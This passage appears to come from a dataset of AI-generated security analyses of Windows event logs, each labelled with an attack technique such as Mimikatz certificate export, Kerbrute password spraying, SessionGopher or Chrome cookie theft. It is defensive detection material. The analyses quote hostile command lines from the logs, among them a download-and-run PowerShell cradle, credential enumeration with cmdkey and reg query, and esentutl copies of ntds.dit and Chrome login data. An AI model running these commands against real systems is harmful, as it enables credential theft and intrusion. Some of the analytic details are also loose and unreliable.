   - Change credentials for the account `bruce.wayne@contoso.com` and possibly any affected accounts.
   - Conduct a full audit of `SERVER002\admin_test` account activities across systems for any further signs of compromise.

2. **Investigative Measures:**
   - Deep dive into logs around the same timeframe for any similar activities or abnormal patterns.
   - Verify if there have been any successful brute force attempts or suspicious logins.

3. **System Hardening and Monitoring:**
   - Evaluate and enhance monitoring solutions to detect such malicious scripts in real-time.
   - Implement stricter PowerShell execution policies with logging to capture command history.
   - Ensure that all accounts, especially privileged accounts, have multi-factor authentication enabled.

Addressing these findings promptly is crucial to preventing any further unauthorized access or data breaches."
Export Certificates with Mimikatz,"After conducting a thorough analysis of the provided Windows event logs from the Application, Security, Sysmon, Windows PowerShell, and System logs, the following observations were made:

### Key Observations

1. **Application Log:**
   - The entries primarily show activity from the Software Protection Platform Service and Windows Defender being active. This is standard behavior and does not indicate any malicious actions.

2. **Sysmon Log:**
   - Multiple process creation events (Event ID 5 and Event ID 1) have been logged:
     - **PowerShell Execution**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` was run by the user `SERVER002\admin_test`. The execution of PowerShell without any command-line arguments or scripts loaded is noted but doesn't immediately indicate anything suspicious.
     - Frequent use of **conhost.exe**: This is typically used to manage console windows and is seen in conjunction with multiple processes. Without additional context, frequent appearance alone does not indicate malicious behavior.
     - **wevtutil.exe Execution**: The utility `wevtutil.exe` was executed multiple times. This tool can be used to clear event logs, which could be suspicious if paired with log deletions, but no such malicious intent can be gleaned directly from the logs provided.
     - **HOSTNAME.EXE and WHOAMI.EXE**: These utilities were run, but they are common troubleshooting commands; running them alone is generally not suspicious.
     - **cmd.exe with suspicious command line**: The notably suspicious aspect involves the execution of `cmd.exe` with a command line referencing a script located within `C:\Users\ADMIN_~1\AppData\Local\Temp\file\.. \Externalfiles\x64\script.exe` with arguments like `crypto::certificates /systemstore:local_machine /store:my /export`. This indicates a potential attempt to export system certificates, which is highly unusual and potentially malicious activity.

3. **Security, Windows PowerShell, and System Logs:**
   - Not provided which limits the comprehensive scope of analysis particularly for authentication events, user activities, and system-level alerts. 

### Assessment

Based on the detailed review of these logs, the following conclusions can be drawn:

- The activity involving the `cmd.exe` execution with a relative path to export certificates is highly indicative of potentially malicious behavior. The combination of the usage of PowerShell, `wevtutil.exe`, and certificate exporting points toward potential malicious intent.

- The consistent identity of the user `SERVER002\admin_test` executing these potentially harmful processes warrants further investigation into this account's activities and credentials.

### Resolution

**Resolution: MALICIOUS**

The findings specifically around the execution of the script to potentially exfiltrate certificates lead to the conclusion that there is potentially malicious activity present. Immediate actions should be taken to:
- Isolate the affected host.
- Perform a thorough incident response, including reviewing the actual script referenced and any network activity logs that coincide with the time of these events.
- Investigate the `SERVER002\admin_test` account for unauthorized access or compromise.
- Review any potential data exfiltration attempts, particularly focusing on certificate stores.

### Guidance

- Ensure comprehensive logging and alerting for `cmd.exe`, `PowerShell`, and any utilities capable of interacting with security settings or sensitive data.
- Evaluate security measures around administrative accounts and access to sensitive directories.
- Enhance monitoring of unusual process creations and command-line executions, including reviewing the context and environments where these activities occurred.
- Reinforce endpoint security measures to prevent unauthorized script executions, including application whitelisting or software restriction policies."
Crafting Active Directory silver tickets with mimikatz,"Based on the provided Windows event logs, I've identified several points that warrant additional investigation:

1. **Command-Line Usage and Execution Paths**:
   - The logs show an execution of cmd.exe with the command line `\""C:\\Windows\\system32\\cmd.exe\"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\x64\\script.exe`. This behavior, especially when seeing the usage of `..` in paths, can sometimes indicate attempts to access files outside the normal directory structure, which could be a tactic to hide file executions.
   - Additionally, this command was executed with a high integrity level by the user `SERVER002\\admin_test`, which might suggest an elevated privilege was used.

2. **Frequent Execution of Microsoft Edge Update**:
   - MicrosoftEdgeUpdate.exe is observed running multiple times in quick succession. This could be part of normal update behavior, but without verification, excessive update invocations could point towards misuse by malicious scripts disguising themselves under legitimate processes.

3. **Use of System Utilities**:
   - The execution of `wevtutil.exe` several times can be considered suspicious, especially if the logs show it being used without a clear reason. This utility can be used to manage event logs, potentially deleting or tampering with them.
   - Similarly, `whoami.exe` was used, which might suggest an attempt to verify user privileges or system context, especially if the user already is aware of their current user context.
   
4. **Events with NT AUTHORITY\SYSTEM**:
   - Many activities, including service startups and system management tasks, are executed under the `NT AUTHORITY\SYSTEM` account, which is typical for system operations. This in itself isn't suspicious, but any unusual actions performed by this account should be verified for legitimacy.

5. **Security and System Events**:
   - Security events like 4624 (successful logon) and 4672 (special privileges assigned to a new logon) are frequently logging similarly to normal Windows operations. However, they offer an opportunity to ensure these accounts and actions are legitimate.
   - Event ID 5379 related to credential operations returned a specific error code (Return Code 3221226021), which suggests an access or authentication issue.
   
6. **Usage of Embedded Scripting**:
   - The invocation of command-line actions from within PowerShell scripts could indicate an attempt to run additional scripts that load external files, frequently seen in fileless malware activities.

Given these observations, the overall activities need further investigation to determine legitimacy, particularly concerning the context and necessity of these actions.

### Resolution
- **SUSPICIOUS**: The activities appear potentially harmful, and further detailed analysis is necessary to confirm malicious intent or benign use. It is recommended to:
  - Verify the purpose of the cmd execution and paths involved.
  - Check for any unapproved or unusual software/script executions.
  - Review any administrative-level actions performed by `admin_test` and ensure they are in line with expected activities.
  - Cross-reference with any other available logs or detections for abnormal behaviors correlating with these activities.

Before labeling the events as definitively malicious, it's crucial to gather more context, including user behavior, software update schedules, and a review of threat intelligence regarding similar patterns."
Credential Dumping with NPPSpy,"Upon analyzing the provided Windows event logs, particularly focused on the PowerShell and Sysmon logs, several suspicious activities are evident. 

### Key Observations

1. **Suspicious PowerShell Activity:**
   - The PowerShell logs show the execution of a script that:
     - Copies an external DLL (`script.dll`) to the `C:\Windows\System32` directory.
     - Modifies registry settings under `HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order` to include `"",script""`.
     - Creates new registry keys within `HKLM:\SYSTEM\CurrentControlSet\Services\script\NetworkProvider`.
     - Sets properties such as `Class`, `Name`, and `ProviderPath` (pointing to the newly copied DLL).
     - The script concludes with an instruction indicating stored credentials will be left in a file at `C:\script.txt` after user re-login.

   These actions suggest the possibility of malicious modifications intending to establish persistence and intercept or gather sensitive information like passwords.

2. **Associated Sysmon Events:**
   - Several Sysmon logs correlate with PowerShell activities:
     - Execution of `powershell.exe` as `SERVER002\admin_test`, with high integrity level, indicating administrative privileges execution.
     - The sequence of process creation involving PowerShell and conhost.exe, which might imply console manipulation or task obfuscation.

3. **Contextual Indicators:**
   - The use of a temporary file path and registry modification are commonly used techniques by malware to achieve persistence.
   - The clear instruction in the script output to find plain text passwords upon re-login is a clear sign of potential credential theft attempt.

   

### Analysis

- **Persistence Mechanism:** The use of the system directory for DLL placement, modification of registry pathways to include unauthorized DLL loading, and service creation suggest a strong inclination towards establishing a persistence mechanism.
- **Potential Credential Harvesting:** The script's message highlights a tactic intending to capture cleartext passwords, indicative of credential harvesting.

### Assessment

Based on the observed behaviors, script actions, and Sysmon correlation, these logs display strong indicators of **MALICIOUS** activity. The combination of unauthorized system modifications and intent for credential theft affirm this conclusion.

### Recommendations

1. **Immediate Response:**
   - Isolate the affected system (`Server002`) from the network to prevent further compromise.
   - Conduct a thorough forensic investigation of the system, focusing on the DLL mentioned (`script.dll`) and any other unexpected binaries in system directories.
   - Review and restore registry changes from the script execution.

2. **Credential Assessment:**
   - Initiate password changes for users, especially `admin_test`, and closely monitor for further suspicious activity.
   - Check for any anomalies or unauthorized access attempts related to credentials within the organization.

3. **Preventative Measures:**
   - Strengthen PowerShell logging and monitoring for enhanced detection of similar scripts.
   - Implement and regularly update a robust Endpoint Detection and Response (EDR) solution.
   - Conduct security awareness training covering such threats like phishing that may lead to initial execution of malicious scripts.

4. **Post-Incident Review:**
   - Determine the initial vector for this script execution to mitigate future risks.
   - Reassess access controls and ensure least privilege principles are in place across the network.

Given these steps and observations, the activity within these logs is confirmed as **MALICIOUS**. Immediate action should be taken to contain, eradicate, and recover from this incident."
Brute Force:Credential Stuffing using Kerbrute Tool,"During the analysis of the provided Windows event logs, several patterns and activities have been identified that raise suspicion about potential malicious activities:

1. **Use of PowerShell with Suspicious Commands**: 
   - Multiple Sysmon and PowerShell logs indicate the execution of a PowerShell script (`script.exe`) located in a temporary directory. The use of PowerShell, particularly referencing terms like ""bruteforce,"" is a red flag for potential malicious activity. This could indicate an attempt at credential harvesting or unauthorized access attempts using brute force techniques.

2. **Environmental Execution and Context**:
   - The PowerShell script executes from the `Temp` directory, which is commonly used for storing temporary data and is often leveraged by attackers to deploy and execute malicious payloads. The command includes `bruteforce.txt`, which aligns with potential penetration or unauthorized access operations.

3. **Process Activities**:
   - A pattern observed shows high-level access (High Integrity Level) for processes initiated by `admin_test`, which executed several system utilities like `wevtutil.exe`, potentially for exporting logs (`epl` export), indicating log clearing or data exfiltration actions.

4. **Elevated Privileges**:
   - The presence of Event ID 4672 indicates that `SYSTEM` had several high privileges including `SeDebugPrivilege`, `SeTcbPrivilege`, and `SeTakeOwnershipPrivilege`, suggesting a possibly scheduled task or maintenance task accessed by an admin account; however, combined with the suspicious PowerShell execution, it suggests possible misuse.

5. **Security Authentication Events**:
   - Event ID 4624 indicates a successful login of `SERVER002$` using the `SYSTEM` account. While this on its own is not suspicious, in conjunction with the other events, it may point to unauthorized access or persistence mechanisms.

6. **Edge Update Service Stop and Restart**:
   - The application logs indicate the `edgeupdate` service stopped, which could be benign (routine update) but in combination with other activities, such as the suspicious process executions immediately afterward, it could suggest an attempt to disable automatic updates to evade detection.

### Assessment and Recommendation:

Based on the findings and analysis, the observed behavior has several indicators that are inconsistent with routine system or user activity and suggests potential malicious or unauthorized activities. The use of PowerShell with suspicious scripts, high-level system access, and potential log export commands align with known methods used in cyber-attacks.

**Final Resolution: SUSPICIOUS**

**Next Steps:**
- Conduct a deeper investigation into the context and actions surrounding the PowerShell execution, particularly focusing on the `script.exe`.
- Analyze network activity logs to identify external communications possibly linked to the script execution.
- Perform a broader check for IOCs (Indicators of Compromise) on the host.
- Validate with the system's intended usage policies to identify any anomalies not consistent with legitimate use.
- Consider proactive incident response measures, including system and network forensics, to contain any potential threat and eradicate malicious actors or tools."
LSASS read with pypykatz,"Analysis of the provided Sysmon log events:

1. **Processes involved:**
   - `powershell.exe`
   - `conhost.exe`
   - `wevtutil.exe`
   - `hostname.exe`
   - `whoami.exe`
   - `cmd.exe`

2. **File Execution:**
   - PowerShell is executed (`powershell.exe`). While PowerShell is a commonly used tool for administrators, it is also frequently used by attackers. The absence of command-line arguments makes it difficult to assess the intent accurately.
   - `wevtutil.exe` is being executed. This utility is used to retrieve information about event logs and publishers. Its legitimate use might be for log reading, but it is often leveraged in log clearing activities by attackers.
   - Execution of command prompt (`cmd.exe`) with a command that appears to invoke a script possibly related to credential access or other malicious purposes: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\venv_data_001\Scripts\script"" live lsa`. The presence of `lsa` in the arguments could be suspicious considering LSA (Local Security Authority) functions, often targeted in credential dumping attacks.

3. **Users and Privileges:**
   - All processes were executed under the user `SERVER002\admin_test`. The elevated integrity level indicates high privileges, which is noteworthy as these could be abused for malicious purposes.

4. **Chained Execution and Parent/Child Relationships:**
   - Multiple `conhost.exe` processes are invoked, typically to host command-line sessions or applications. This behavior is normal; however, it should be contextualized with the invoking application.
   - `whoami.exe`, `hostname.exe`, and `cmd.exe` are parented to `wsmprovhost.exe`, which is a legitimate Windows process related to Windows Remote Management. Although this execution path is typical in admin tasks, the command executed in `cmd.exe` is suspicious.

5. **Indicators of Potential Malicious Activity:**
   - The use of `cmd.exe` to execute a script with the argument `live lsa` is potentially concerning. Without additional context or visibility into the script, its purpose remains unknown but could be related to credential access.
   - The sequential use of `wevtutil.exe` suggests possible log tampering or reconnaissance efforts.
   
6. **Logs Not Provided:**
   - The absence of Security, System, PowerShell, and Application logs limits a complete assessment. Logs such as PowerShell Operational or Security logs would offer deeper insights into the behavior surrounding observed events.

**Conclusion:**

- **Resolution: SUSPICIOUS**

Given the sequential nature of potentially malicious processes and the presence of a suspicious script execution, there is a significant cause for concern. However, without direct evidence of malicious activity or impact, this necessitates further investigation. The specific command executed with `cmd.exe` requires review and monitoring should continue for unexpected behavior.

**Guidance:**
- Investigate the script referenced by the `cmd.exe` execution, particularly focusing on its purpose and behavior.
- Review surrounding events for `wevtutil.exe` to ensure no log manipulation.
- Validate the legitimacy of processes executed under `admin_test` and verify recent user activity within the environment.
- Increase logging and monitoring around PowerShell activities to capture specific command-line actions."
Cached Credential Dump via Cmdkey,"Based on the analysis of the provided Windows event logs across various channels, we can conclude the following:

### Analysis:

1. **System Log:**
   - The System logs primarily record updates regarding Microsoft Defender Antivirus (`KB2267602`). These logs do not show any unusual or abnormal behavior and correspond to routine security updates.

2. **Application Log:**
   - Event indicating Windows Defender is in an active state (`SECURITY_PRODUCT_STATE_ON`). This is expected in a secure environment and does not indicate any issue.

3. **Security Log:**
   - The logs capture a sequence of login/logout events and privilege assignments associated with the `admin_test` user. The user has a series of high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) which are concerning if not typical for this user. However, this by itself does not necessarily indicate malicious activity but warrants a review of user roles and permissions.
   - Events such as `LogonType 3` indicate a network logon, normal if the user accesses the server remotely.
   - `EventID 5379` with `ReturnCode 3221226021` suggests failed credential access attempts, which could be problematic if unexpected.

4. **Sysmon Log:**
   - Frequent execution of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `cmdkey.exe`, and `whoami.exe` by `admin_test`. These executions can be typical for administrative tasks but need scrutiny (especially `cmdkey` usage which lists credentials).
   - `cmd.exe` executed with `/c cmdkey /list` indicates listing stored credentials; this action is suspicious, especially if the listed credentials are not intended to be accessed at this time.
   - Execution of Windows update components and Edge update processes appear routine for system updates and do not directly indicate any compromise.

### Conclusion:

- The presence of `cmd.exe` executing `cmdkey /list` is suspicious as it could denote enumeration of stored credentials, a common reconnaissance step in malicious campaigns.
- The administrative privileges used during session events and credential access failures might indicate benign administrative actions, but their context and necessity should be verified.

### Resolution:

- **SUSPICIOUS:** The evidence of credential enumeration actions alongside high privileged operations by `admin_test` is suspicious and needs further investigation. It's crucial to:
  - Verify the legitimacy of `admin_test` user actions and confirm if they align with standard operational procedures.
  - Review if these actions were scheduled or part of intended administrative maintenance.
  - Investigate any external indicators or alarms related to the user or system during this period.
  - Increase monitoring of the affected host and user account for any additional anomalies or unauthorized activity.

Further threat hunting and verification of user intent are essential to determine if there is malfeasance or a benign explanation."
WinPwn - SessionGopher,"Upon analyzing the provided Windows event logs, here is a detailed assessment:

### System Logs:
- The logs show time changes through `svchost.exe`, which frequently manages Windows services. However, the time skew is minimal and aligns closely with the Time Service synchronization with a valid NTP server (`time.windows.com`). This suggests time synchronization rather than manipulation, which is generally benign when working properly.

### Application Logs:
- The Application log shows `SecurityCenter` with Windows Defender being active and no errors reported during the monitored period. This is a positive indicator, reflecting that security protections are active.
- There is mention of `edgeupdate` service stopping. This is typically a part of Microsoft Edge updates and may coincide with update installations. Stopping and starting services during updates is not unusual, particularly for browser updates.

### Windows PowerShell Logs:
- These logs raise a red flag. They show `powershell.exe` invoking a download of a script from `raw.githubusercontent.com`, followed by the execution of `sessionGopher`, which is a known post-exploitation framework often used for session hijacking and credential dumping.
- The method of using `iex(new-object net.webclient).downloadstring(...)` indicates a potential fileless attack, directly executing contents from the web without saving them to disk, making it harder to detect using traditional antivirus methods.

### Sysmon Logs:
- Multiple `whoami` and `hostname` commands appearing suggest a potential reconnaissance or environment discovery characteristic of a penetration attempt.
- There is a consistent focus on processes related to Edge updates. The specific command-line arguments and paths do not immediately alarm us as malicious, as they appear consistent with legitimate update workflows by Microsoft Edge and Microsoft EdgeUpdate utility.

### Security Logs:
- Security log entries for event ID 4616 indicate harmless system time updates via `svchost.exe` which appear to align with the System time service updates and are logged by a Local Service account, a standard user context for running service processes.

### Conclusion:
The critical indicator of potential malicious activity comes from the PowerShell logs. The use of PowerShell to download and execute scripts from a public repository, particularly scripts not verified as legitimate, is a common tactic in malware deployment and lateral movement within compromised environments.

**Resolution**: **MALICIOUS**

**Guidance**:
1. **Immediate Containment**: Isolate the host `Server002` from the network to prevent further potential malicious activity or lateral movement.
2. **Investigation**: Conduct a comprehensive investigation on `Server002` focusing on any file or network indicator tied to `sessionGopher` and any outbound communications that match known malicious IPs or domains.
3. **Forensics**: Extract memory and disk data from the host for forensic analysis, particularly focusing on the timeline and establish how the PowerShell script was initialized.
4. **Remediation**: Based on findings, clean or reimage the server, and change any credentials that might have been accessed.
5. **Harden and Monitor**: Increase security layers around PowerShell execution policies, network segmentation to limit exposure, and continuous monitoring for usage patterns similar to those identified.

These actions will mitigate the risk and help understand the impact and scope."
Enumeration for PuTTY Credentials in Registry,"After reviewing the provided logs, here is a detailed analysis highlighting any suspicious or anomalous behavior:

1. **Security Log Insights:**
   - **Event ID 4616:** There are repeated changes to the system time, which could indicate time-tampering potentially carried out by malware to avoid detection or to confuse log timestamps.
   - **Event ID 4672 and 4624:** User ""admin_test"" is granted a series of high privileges, including `SeDebugPrivilege`, which can be used for malicious purposes such as injecting code into other processes. This activity followed by a successful logon with `LogonType` 3 (network logon) might indicate an authorized user or attacker with admin privileges.
   - **Event ID 4634:** The admin_test account logs off shortly after the logon and privilege escalation, which may suggest intention to cover tracks post remote privilege gain.

2. **Sysmon Log Insights:**
   - **Usage of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe`:** These are legitimate Windows utilities but are often repurposed by attackers for purposes like log clearing (`wevtutil.exe`) or querying the registry for sensitive information (`reg.exe`). Running these utilities in quick succession is worth deeper investigation.
   - **Command Line Execution with reg.exe:** The usage of command `reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s` suggests that there might be an attempt to extract saved PuTTY sessions, possibly to gather SSH credentials or configurations.
   
3. **System and Application Logs:**
   - **Frequent Edge Update Executions:** There are multiple logs relating to Microsoft Edge updating several times within a short period, which, while not inherently malicious, could indicate tampering if there is an unusually high frequency without any user-triggered updates.

**Assessment & Recommendations:**

- **Assessment:** The pattern of privilege escalation, use of system tools associated with log manipulation and registry queries, and rapid execution of various processes, all point to potentially unauthorized activity. Specifically, the privilege escalation and command execution scenarios require further inspection of the context these processes were executed in.
  
- **Risks:** Potential risks include unauthorized access and data exfiltration using elevated rights or collected credentials (PuTTY configurations). The behavior strongly suggests preparation actions often executed by a malicious entity.

- **Recommendations:** 
  - Perform targeted forensic investigation on the `admin_test` account activities, especially focusing on the origin and intent of these command executions.
  - Implement alerts for unusual privilege elevations and non-typical executions of administration tools.
  - Review network traffic around the timestamps of activities detected in the logs for potential data exfiltration.
  - Conduct a thorough review of all affected systems and consider implementing tighter access controls and monitoring measures for privileged accounts.

**Resolution: SUSPICIOUS**

The activities captured in these logs, particularly concerning privilege use and command-line activities, are suspicious and should be further investigated to confirm or rule out malicious intent."
Create Volume Shadow Copy with Powershell,"Upon reviewing the provided Windows event logs across multiple components (Application, Windows PowerShell, Sysmon, Security, and System logs), I have derived the following key observations:

### Analysis:

#### Windows PowerShell Logs:
- The logs indicate the use of PowerShell to execute a command that creates a shadow copy using Windows Management Instrumentation (WMI): `(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')`.
- Creating shadow copies may be a legitimate operation for backup purposes, but is also a technique used by malware to evade detection by ensuring backups can be restored from. The lack of additional details or specific follow-up actions makes this look slightly suspicious but not conclusively malicious.

#### Sysmon Logs:
- Several instances of `wevtutil.exe` and `conhost.exe` are logged, which can be typical under certain admin tasks or automated processes. `wevtutil.exe` is used for managing Windows event logs, and its use by `admin_test` is generally legitimate unless correlated with abnormal behavior.
- Events related to the execution of `powershell.exe` align with the PowerShell activity previously observed. The shadow copy activity is not found further in these logs.

#### Security Logs:
- Security logs show normal local services and system operations. 
- The logon by admin_test appears legitimate but without clear context regarding unusual login times or behavior.
- No anomalous privilege escalations, apart from what could be expected for shadow copy creation, were found.

#### System Logs:
- Time correction events are logged, which indicate an NTP time synchronization operation. Whilst not directly malicious, such actions could be part of advanced multi-step attacks where time-based logging obscurity is desired. However, in isolation, this stands out as more of an operational event.

### Risk Assessment and Conclusion:

- **Suspicious Activity Identified:** The PowerShell command for creating shadow copies is notable given its misuse in malicious contexts, particularly in ransomware attacks as a precursor for file encryption without detection. 
- **Wevtutil and conhost spikes** are somewhat atypical but difficult to assess as malicious without additional context, such as exterior logs or network data corroborating command and control activity or lateral movement.

### Recommendation:

- **Resolution:** **SUSPICIOUS**
  - Further investigation warranted into the source and intent of the PowerShell commands. Determine if this was part of legitimate administrative tasks or part of unauthorized scripting.
  - Check for any ongoing or scheduled tasks that may still use setups from a malicious actor. Also, review any recent policy changes regarding permissions around shadow copy and PowerShell script usage.
  - Conduct a deeper threat hunt on `Server002` to check for further indicators of compromise (IoCs), especially looking for any follow-up activities related to ransomware or unauthorized backups.
   
These findings should be communicated to the security response team for immediate triage and potential remediation actions."
Steal Chrome Cookies (Windows),"Upon reviewing the log entries provided, the following observations and analysis can be made:

1. **PowerShell Execution**:
   - There are events showing the execution of PowerShell with a command to extract cookies from Google Chrome's storage. The command includes stopping any existing ""chrome"" processes and using `sqlite3` to query the cookies database. The extracted data is then saved to a file.
   - This activity is typically associated with attempts to access sensitive information without the user's consent. The sequence of operations suggests data exfiltration.

2. **Process Creation and Execution**:
   - There are several process creation logs for PowerShell, CMD, and `sqlite3.exe`, involving the `admin_test` user. The use of `sqlite3.exe` directly on the cookies database is not typical for standard user activities and is aligned with the observed PowerShell script's objective.
   - The activity appears to be coordinated and part of a larger script or automated task, possibly indicative of a malicious actor attempting to collect sensitive browser data.

3. **Service and System Process Activity**:
   - Multiple instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are logged, likely associated with routine updates. Activities related to this process don't raise immediate red flags considering the context of legitimate update behavior.

4. **Sysmon Logs**:
   - The Sysmon logs reveal several high-integrity level processes running scripts and commands. Given the administrative level (User: SERVER002\\admin_test), this could be exploited for privilege escalation or unauthorized data access.

5. **Chronological Sequencing**:
   - The sequence of events points to a specific timeframe where PowerShell, CMD, and SQLite processes were executed, which could correlate with an unauthorized access attempt or script execution.

**Assessment**:
- The activities involving command-line PowerShell invocation to manipulate and extract data from Chrome's cookies without user consent or apparent legitimate purpose raise significant security concerns. The use of PowerShell to automate interaction with the SQLite database indicates potentially malicious scripting actions.

**Resolution**:
- **MALICIOUS**: The presence of unauthorized data access and extraction attempts suggest that the activity is malicious. It merits immediate containment and investigation to prevent data theft or further compromise of system integrity.

**Guidance**:
1. **Immediate Action**:
   - Isolate the host to prevent further exfiltration or lateral movement within the network.
   - Initiate a deeper forensic investigation to identify the origin and intent of the malicious activity.
   
2. **Review and Hardening**:
   - Check user accounts for any unauthorized changes and reinforce password policies.
   - Audit PowerShell execution policies and Scripts Block Logging to detect any further unauthorized script usage.

3. **Alerting and Monitoring**:
   - Enhance logging and monitoring on privileged accounts and sensitive data access.
   - Establish alerts for similar suspicious PowerShell and command-line activities to catch such actions in real-time in the future."
Create Volume Shadow Copy remotely (WMI) with esentutl,"Upon reviewing the provided logs, here is the detailed analysis focusing on potential indicators of malicious activity:

### Application Log
- The log entries involving the **VSS** (Volume Shadow Copy Service) indicate errors related to ""CoInitialize has not been called."" This is a typical error that can occur due to misconfigured services but is not necessarily indicative of malicious activity.
- The entry from **Microsoft-Windows-Security-SPP** references a Software Protection Platform Service event, which does not immediately suggest malicious behavior.

### Security Log
- **EventID 4799** indicates a group membership enumeration performed by a user. The process ""C:\Windows\System32\esentutl.exe"" is suspicious given its typical use related to backup and recovery operations for databases or file copying. If used inappropriately, it can indicate an attempt to access or exfiltrate sensitive data (like AD databases).

### Sysmon Log
- Multiple entries under **Sysmon EventID 1** show use of command-line utilities like **cmd.exe**, **wmic.exe**, and **esentutl.exe**. Of particular concern is the command line invoking `esentutl.exe` to interact with `ntds.dit`. The `ntds.dit` file is the AD database, and making copies of this file or modifying it can be a part of credential theft or privilege escalation attempts.
- Recurring processes of `wevtutil.exe` and `conhost.exe` being spawned in rapid succession could indicate script-based automation or exploitation.
- It's notable that the logged-on user ""SERVER002\\admin_test"" is executing these processes, and the actions occur with high integrity level, suggesting potential privilege misuse.

### Windows PowerShell Log
- There is no content provided for the PowerShell logs, but given the suspicious activity in other logs, it is worthwhile to verify any available PowerShell logs for script execution or remote command attempts.

### System Log
- Windows Update activity is logged, which appears to show normal security updates being installed, not indicative of a compromise.

### Indicators and Conclusion
The usage of `esentutl.exe` to interact with Active Directory database files (`ntds.dit`) through command-line utilities like `cmd.exe` in quick succession, coupled with the VSS errors, may indicate attempts to access or copy sensitive data. While not inherently malicious, these actions align with known attack patterns seeking to gather credentials from domain controllers.

### Resolution
**SUSPICIOUS** - The logs contain suspicious activity that warrants further investigation. Specifically:
- Investigate why `esentutl.exe` accessed `ntds.dit` and the context of its usage.
- Review user ""SERVER002\\admin_test"" actions and ensure this account has not been compromised.
- Examining PowerShell logs if available may provide further insight into whether there was a scripted attack.

### Guidance
1. **Containment:** Temporarily limit the access rights of the ""admin_test"" user account.
2. **Investigation:** Conduct a deeper audit of the user's activity, especially around the time of the suspicious entries.
3. **Forensic Analysis:** Examine the AD database and other critical files for unauthorized modifications or data exfiltration attempts.
4. **Monitoring:** Increase monitoring on the server for any further suspicious activities, and cross-check with network logs if available for any signs of an intrusion or data transfer anomalies."
Password Spray using Kerbrute Tool,"Upon analyzing the provided Windows event logs, here's a detailed breakdown of the activities observed:

1. **Suspicious PowerShell Activity**:
   - A critical event is the execution of PowerShell with a command that potentially indicates unauthorized activity. The logs show PowerShell being used to run a command with the script `passwordspray`, suggesting a password spraying attack. This is evidenced by the following:
     - CommandLine from Sysmon EventID 1: `""powershell.exe"" & {cd \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\\"", .\\script.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\passwordspray.txt\"" password132}`
   - PowerShell log entries corroborate this command execution.

2. **Wevtutil.exe Usage**:
   - Several instances of `wevtutil.exe` are observed in the logs. This tool is often used to export event logs, which can be legitimate but might also indicate an attempt to evade detection by an attacker who is trying to manipulate or clear logs.
   - EventID 1 mentions: `""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`

3. **Multiple High-Integrity Process Executions**:
   - A pattern of high-integrity processes, executed by the same user (`SERVER002\\admin_test`), such as the use of `powershell.exe`, `wevtutil.exe`, and `conhost.exe`. Consistently high integrity and usage of administrative tools suggest privilege escalation activities.

4. **Security Logs**:
   - Security events (e.g., EventID 4624) indicate successful logons with elevated privileges. Multiple successful SYSTEM logon events suggest secured sessions, which might be exploited for privilege escalation.

Based on the above analysis, the logs contain strong indicators of **MALICIOUS** activity. The suspicious usage of PowerShell for password spraying, combined with the execution of log-exporting utilities, suggests an attempt at lateral movement and potential attempt at evasion tactics.

**Recommendations**:
- **Immediate Response**: Isolate the affected host (Server002) to prevent further unauthorized access or potential spread within the network.
- **Forensic Investigation**: Conduct a detailed forensic analysis of the server to understand the full impact, assess any data exfiltration, and identify further malicious activities.
- **Review Access Logs**: Carefully audit access controls and logs within your network for similar indicators of compromise.
- **Strengthen Security**: Implement network segmentation, strict user account control policies, and further monitoring on privileged accounts.
- **Security Awareness**: Train staff on recognizing phishing attacks and the risks associated with password-resilience practices.

Given the clear evidence of malicious intent and activities in these logs, treating this incident as MALICIOUS ensures appropriate and swift action."
Dump Chrome Login Data with esentutl,"### Log Analysis

Upon reviewing the provided Windows Sysmon logs, a few notable points arise regarding potential malicious or suspicious activity:

1. **Frequent and Repeated Execution of Commands:**
   - The logs show a pattern of commands being executed repeatedly in quick succession with very minimal delay between processes. This pattern is unusual under typical usage scenarios and often indicative of automated scripts or scheduled tasks.
   - Commands such as the execution of `esentutl.exe` to manipulate the Chrome `Login Data` file are observed. This is uncommon unless someone is attempting to export data or modify browser login credentials.

2. **Suspicious Use of `esentutl.exe`:**
   - `Esentutl.exe` is seen accessing the Chrome user data to process the `Login Data` file. This action suggests an attempt to access or manipulate credential information stored within the Chrome browser, possibly extracting login data. This behavior is suspicious, considering legitimate processing of this file by `esentutl.exe` is not standard practice.

3. **Presence of High Integrity Processes:**
   - Many processes, such as PowerShell, conhost.exe, and whoami.exe, are running at a high integrity level. While not inherently malicious, their execution in a deliberate sequence, coupled with the username SERVER002\admin_test, suggests possible exploitation of administrative privileges.

4. **Command Line Indications:**
   - The usage of the `cmd.exe` command followed by `esentutl.exe` with specific arguments targeting local app data suggests a non-standard use-case, often seen in malicious activities attempting to extract or manipulate files for unauthorized purposes.

5. **Use of Administrative Account:**
   - All actions are executed under the user `SERVER002\admin_test`, which appears to be an account with administrative privileges. The repeated use and high-level interactions performed by this account raise concerns about potential misuse or compromise of admin credentials.

### Assessment

Based on the analysis of the log entries, the activities recorded within this timeframe show evidence of potential compromise. Specifically, the use of `esentutl.exe` in relation to the Chrome `Login Data` file in such a methodical and automated manner suggests an attempt to access sensitive information. Furthermore, the execution of various tools with administrative privileges, along with the scripted nature of the execution workflow, reinforces a possible malicious intent.

### Resolution

**Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Mitigation:**
   - Disable the account `SERVER002\admin_test` or reset its password. Investigate the legitimacy of the account usage and whether it aligns with typical user behavior.
   - Isolate the affected host (Server002) from the network to prevent potential data exfiltration or lateral movement.

2. **Further Investigation:**
